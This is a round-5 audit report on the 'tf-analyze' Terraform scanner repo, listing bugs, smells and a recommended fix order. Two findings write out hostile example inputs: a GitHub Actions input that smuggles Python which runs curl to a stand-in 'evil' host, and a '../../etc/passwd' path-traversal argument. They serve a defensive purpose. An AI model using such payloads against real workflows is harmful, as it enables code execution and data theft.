# tf-analyze repo audit — round 5 (post-R30.11 + ext v0.1.48)

**Date:** 2026-05-11 (after R30.11 / ext v0.1.48 shipped, closing 17 of 21 round-4 findings)
**Method:** Four parallel `Explore` subagents on the least-audited surfaces; ~38 raw findings synthesised + verified here.

**Surfaces audited:**
- R30.11 regression-of-fix + the eight R30.19 helper modules (`_cache`/`_diff`/`_registry`/`_plan_state`/`_apply_fixes`/`_baseline`/`_modes`/`_verify`)
- Catalog YAML schema + the 147 test fixtures + docs site Jekyll plumbing
- Terraform provider Go code + GitHub Action `action.yml` + badge service + public scanner + HCP run-task + MCP server
- `detect.py` regions outside the god functions (imports, argparse setup, mode dispatch, `--catalog` argument handling)

**Out of scope:** Everything closed by the four prior audit rounds. 6 items deferred to standalone structural PRs (`_brace_walk`, `_output.py` CSS dedup, attack-graph regex rationale, magic threshold 60 for pruning, urgency-rank fallback unification, urgency-colour consolidation).

---

## Critical bugs (real correctness risk — fix first)

| # | File:line | Risk | What breaks | Confidence |
|---|---|---|---|---|
| 1 | `action.yml:376, 379` | **Script injection via GitHub Actions templating into Python heredoc** | `python3 - <<'PY'` is a SHELL heredoc that prevents shell variable expansion (good). But GitHub Actions templating (`${{ inputs.fail-on }}`) runs BEFORE the shell sees the script — Actions does string substitution into the YAML source. A workflow input like `fail-on: '"); import os; os.system("curl evil/$(whoami)"); _ = ("'` becomes literal Python source and executes. The threat model: a reusable workflow whose `fail-on` input is supplied by an upstream caller — the caller can inject arbitrary Python. Mitigation: pass `inputs.fail-on` via `env:` and read with `os.environ["FAIL_ON"]` inside the script (breaks the templating boundary). | **HIGH** — confirmed by reading `action.yml:367-381`. Same class as the SQL-injection-via-template pattern in other YAML CI systems. |
| 2 | `scripts/detect.py:_cmd_explain` (line 2709) | **Path traversal via `--explain` rule_id** | `_cmd_explain(catalog_dir, rule_id)` constructs `catalog_dir / f"{rule_id}.yaml"` without validating the rule_id. `python3 detect.py --explain ../../etc/passwd` resolves to `<catalog_dir>/../../etc/passwd.yaml` — only `.yaml` files are readable so the blast radius is bounded, but the operator's `~/.aws/config.yaml` or `/etc/ssh/sshd_config.yaml` (if present) is leakable. The sibling `_cmd_new_rule` (line 2759) validates against `_RULE_ID_RE`; `_cmd_explain` should too. | **HIGH** — verified by direct read; trivial reproducer. |
| 3 | `scripts/_diff.py` (lines 23, 69, 77, 84, 92) | **Five `subprocess.run` calls to `git` with no `timeout=`** | A hung git (corrupted repo, NFS stall, lock file held by another process) freezes the scan indefinitely. The CI workflow's `pytest-timeout=300` (R30.10) only protects tests, not the engine. `auto_detect_base_branch`, `get_diff_files`, `trend_get_commits` — all affected. R30.8's panel-side `runEngine` got a 120s timeout; this server-side equivalent was missed. | **HIGH** — direct grep + read; `timeout=` keyword arg absent at every call. |
| 4 | `terraform-provider/internal/provider/scan_data_source.go:302` | **`json.Marshal` error swallowed via `_`** | `findingsJSON, _ := json.Marshal(report.Findings)` — defensive Go convention says don't ignore an error from a stdlib serialiser. If `report.Findings` ever carries a non-serialisable type (a future engine field with a `json.Marshaler` returning an error), `findingsJSON` is empty and `data.FindingsJSON` becomes an empty string. Users gating `terraform apply` on the JSON output get a silent empty value. The fix is one line: `if err != nil { resp.Diagnostics.AddError(...); return }`. | **MEDIUM** — defensive; low likelihood today but a contract violation. |
| 5 | `scripts/_apply_fixes.py:61-72` | **Brace-depth walker in `fix_line_for_arg` is quote-blind** | `first_line.count('{') - first_line.count('}')` naively counts braces. A value like `value = "with { in string" { real_attr = 1 }` corrupts the depth count and either truncates or over-extends the extracted span. Same class the prior audits flagged 12 times in `detect_in_file`'s detector branches — and the same class that `_brace_walk` extraction would close at once. The bug surfaces on complex fix snippets where the engine's `fix_hcl` field contains quoted braces. | **HIGH** — direct read of the depth math; quote-state tracking missing. |

---

## High-severity smells

| # | File:line | Smell | Why it matters |
|---|---|---|---|
| 6 | `scripts/_modes.py:159` (carryover from round 1, still open) | **`parts[1]` after `split(" ", 1)` without length guard** | `line.split(" ", 1)` returns 1 element on a single-token line; the next access `parts[1]` raises IndexError. Round 1's audit #6 flagged this; the round-2 verification claimed it was already guarded by `if len(parts) == 2` — and looking at the code now, that guard IS present at line 160. **Re-verified: closed.** (Listing here so the carryover doesn't reappear in round 6.) |
| 7 | `scripts/_plan_state.py:219, 249` | **`except Exception:` swallows both parse errors AND missing files** | Two parse paths catch the broad `Exception` and silently degrade to "no findings". A `JSONDecodeError` and an `OSError` (file missing) get the same treatment. The operator running `--mode drift --state-json /missing/file.tfstate` sees "no drift findings" — looks like success. Narrow the except clauses: `JSONDecodeError` → parse-error WARN; `OSError` → file-not-found WARN; differentiate. |
| 8 | `integrations/run-task/server.py:107` | **`subprocess.run(..., timeout=120)` does NOT kill the child on timeout** | `subprocess.run` with `timeout` raises `TimeoutExpired` but the child process is left running (Python ≤ 3.13 behaviour). On a heavily-loaded HCP Run Task worker, a series of timeouts accumulates zombie `detect.py` processes that hold file handles open. Use `subprocess.Popen` + `proc.communicate(timeout=…)` + explicit `proc.kill()` in the except branch. |
| 9 | `terraform-provider/internal/provider/scan_data_source.go:331` | **Compliance subprocess ctx-cancellation silently produces empty string** | `cCmd := exec.CommandContext(ctx, ...)` uses the same context as the main scan. If the user aborts `terraform plan`, the compliance step is killed mid-call and `complianceText = ""`. The R30.11 fix promoted compliance-failure to `AddError`, but ctx-cancellation IS a different error path — the cancellation exits the function via the existing `AddError` block (good) BUT the user might want to distinguish "compliance never ran" from "compliance ran clean" downstream. Add an explicit ctx-cancellation diagnostic. |
| 10 | `integrations/badge-service/server.py:336-356` | **`/ingest` payload validated field-by-field; no schema** | The endpoint deserialises JSON and accesses `payload.get("scan").get("summary")` with optional chaining + per-field type checks. A future schema change that adds optional nested fields would miss validation. Pydantic models give a single source of truth + a clear 422 response on shape mismatch. Recommend: introduce a `BadgeIngestRequest` Pydantic model. |
| 11 | `scripts/detect.py:3770, 2947` | **`getattr(args, "lookback", 30)` and `getattr(args, "targets", None)` — inconsistent with R30.8** | R30.8's audit #15 converted five argparse-wired getattr call-sites to direct attribute access (fail-fast on rename typos). Two more sites remain. `args.lookback` is always set (argparse default 30); `args.targets` is always set (action="append" → None or list). Both safe to convert. Inconsistency creates a maintenance hazard. |
| 12 | `integrations/github-action.yml:104, 114, 122, 133` | **`|| true` swallows all engine non-zero exits without distinction** | Each scan invocation has `|| true` so the Action continues past failures. But a CRITICAL crash (OOM, segfault) gets the same treatment as "engine ran successfully, found findings". The R30.11 fix added a try/except around the JSON load, but the underlying engine-died-silently signal is still missed. Capture the exit codes individually and emit `::error::` for any exit ≥ 2. |

---

## Brittleness — works today, breaks under stress

| # | File:line | Brittleness | Trigger |
|---|---|---|---|
| 13 | `scripts/_baseline.py:71` | **`datetime.date.fromisoformat()` strict on `YYYY-MM-DD`** | A baseline file with `expires: 2026-5-11` (no zero-padding) raises ValueError → caught by the function but the WARN message at line 79 says "Use ISO date YYYY-MM-DD" which is technically correct but doesn't mention the missing zero. The R30.8 audit closed the absence of a useful error message; round 5 notes the message could include the offending value verbatim. |
| 14 | `scripts/_registry.py:57` | **5s timeout on every registry lookup, no exponential backoff** | A slow registry stalls the scan by 5s × N modules. The graceful degradation (None → skip check) is correct, but a user running `--check-registry` on a 50-module workspace can wait 4 minutes for stale results. Cache the negative (registry-down) result for the duration of the scan. |
| 15 | `scripts/detect.py:215-229` (`_collect_extra_files`) | **`except (ValueError, OSError):` swallows broken catalogue globs silently** | A catalogue entry with `file_glob: "**/*.tf["` (unclosed bracket) raises `ValueError` from `Path.glob`. The handler catches and continues with an empty list — the rule never fires and the operator has no signal. R30.8's audit #29 closed this for the inline `detect_in_file` glob; the standalone walker `_collect_extra_files` still has the broad catch. |
| 16 | `scripts/_verify.py:110` | **Broken symlinks classified as STALE-LOCATION** | `target_file.exists()` returns False for broken symlinks AND missing files; both render the same "stale location" finding. An operator looking at a STALE-LOCATION finding can't tell if the file was deleted or if the symlink was broken. Add `is_symlink()` check + a separate `BROKEN-SYMLINK` diagnostic. |
| 17 | `scripts/_diff.py:23-29` | **`auto_detect_base_branch` returns "main" silently if not in a git repo** | When git is missing or the cwd isn't a git repo, `git rev-parse` exits non-zero and the function returns the default `"main"`. A subsequent `get_diff_files(target, "main")` walks empty and the scan reports "no findings" — looks like success. Surface a stderr WARN when `git rev-parse` fails for all branches. |
| 18 | `demo/app.py:206-213` | **Per-file `stat().st_size` after `rglob()` — race window if files added/deleted** | `MAX_CLONE_BYTES` guard counts file sizes from `rglob` results, then calls `stat()` on each. A file added between the glob and the stat is missed (silent under-count); a file deleted raises OSError (caught at line 212). High-churn workspaces could bypass the size cap. Accumulate during iteration. |
| 19 | `integrations/mcp-server/server.py:79-80` | **`MAX_OUTPUT_BYTES = 1MB` with no MCP message-size guard** | A 500-finding scan near the 1MB cap could be truncated mid-JSON. MCP messages typically limit at 4MB; the truncated JSON breaks downstream LLM parsing. Measure the serialised response and emit a clean `kind: truncated` envelope when the response exceeds 80% of the MCP limit. |

---

## Subagent claims rejected on re-read

Five subagent findings rejected or downgraded:

- **"4 fixtures missing on disk"** — All five (`inconsistent_backend`, `no_validation_blocks`, `old_required_version`, `wide_provider_constraint`, `module_orphaned`) exist. The agent appeared to assume the canonical `main.tf` layout; several use `variables.tf`/`versions.tf` or `modules/`+`scenarios/` subdirs. The self-test runs 238/238 positive fixtures cleanly — proof the fixtures work.
- **"153 orphaned `*_clean` fixtures"** — these are valid clean-fixture sentinels referenced via `tests/helpers.py:clean_fixture_cases()`. Not orphans.
- **"`cross_module` OSError still unresolved (carryover from round 4)"** — R30.11's audit #6 fix is in place at lines 1541-1550 with the try/except + `is_dir()` guard. The agent cited the wrong line number.
- **"HMAC timing attack via early reject"** — `hmac.compare_digest` is constant-time; the early reject on missing `sha256=` prefix returns the same HTTP 401 with no information leak. Paranoid; rejected.
- **"`_modes.py:159` IndexError"** — Already guarded by `if len(parts) == 2:` at line 160. Round 2 verification was correct; round 5 re-confirmed.

---

## Recommended fix order

Ranked by **(severity × user impact) ÷ effort**:

1. **`action.yml` Python heredoc — pass `fail-on` via `env:`** (10 min). Closes #1. One-line edit to move the templating boundary.
2. **`_cmd_explain` rule_id validation** (5 min). Add `if not _RULE_ID_RE.match(rule_id): return 2` at line 2710. Closes #2.
3. **`scripts/_diff.py` add `timeout=30` to all five subprocess calls** (10 min). Closes #3. Mechanical.
4. **`_apply_fixes.py` quote-aware brace walker** (30 min). Closes #5. The fix is the same shape applied 12 times in the deferred `_brace_walk` extraction — pull this one site forward.
5. **`terraform-provider` `json.Marshal` error check + ctx-cancellation diagnostic** (15 min). Closes #4 + #9. Two adjacent fixes in one file.
6. **`_plan_state.py` differentiate `JSONDecodeError` from `OSError`** (15 min). Closes #7.
7. **`run-task/server.py` switch to `Popen` + explicit `kill()` on timeout** (20 min). Closes #8.
8. **Convert remaining `getattr(args, …)` to direct attribute access** (5 min). Closes #11.
9. **`action.yml` `|| true` → capture exit code + `::error::`** (15 min). Closes #12.
10. **Brittleness items #13-19** — lower priority, defensive hardening; group into a single follow-up PR.

Items 1-3 are the security-critical surface; do these in one PR. Items 4-8 are correctness. Items 9-19 are hardening.

---

## Structural finding

**Round 5 yields the lowest finding count yet — 12 closable items vs. round 1's 41.** The marginal value per audit-round is genuinely shrinking, but two surfaces remain weak:

1. **Quote-blind brace walking** still lives in `_apply_fixes.py:61` AND the 12 deferred `detect_in_file` branches. Pulling the shared `_brace_walk(text, start_pos) -> (end_pos, depth_trace)` helper would close 13 finding-sites in one structural PR. This recommendation has now appeared in 5 consecutive audits; it should be the next dedicated work.
2. **Integration code subprocess discipline** is the new class — both the Terraform provider (ctx cancellation), the run-task server (zombie processes on timeout), and `_diff.py` (no timeout at all) share the pattern of "spawn an external process and trust the worst case." A shared `_safe_subprocess(cmd, *, timeout)` helper would deduplicate this across `scripts/`, `terraform-provider/`, and `integrations/`.

After 5 rounds of audits totalling ~90 closed findings, the repo is meaningfully better defended than the round-1 baseline. The remaining work falls into two categories: (a) the two structural PRs above and (b) a long tail of low-severity hardening items that no longer warrant a dedicated audit round.

---

## Counts

- Subagent reports returned ~38 raw findings.
- Synthesised to **17 findings** (5 critical, 7 high-severity smells, 5 brittleness) + 5 rejected on re-read + 1 already-closed.
- Comparison: round 1 → 41, round 2 → 24, round 3 → 22, round 4 → 21, round 5 → **17**. Diminishing returns curve is unmistakable.
- No regressions introduced by R30.11 fixes themselves (the regression-of-fix check came back clean).
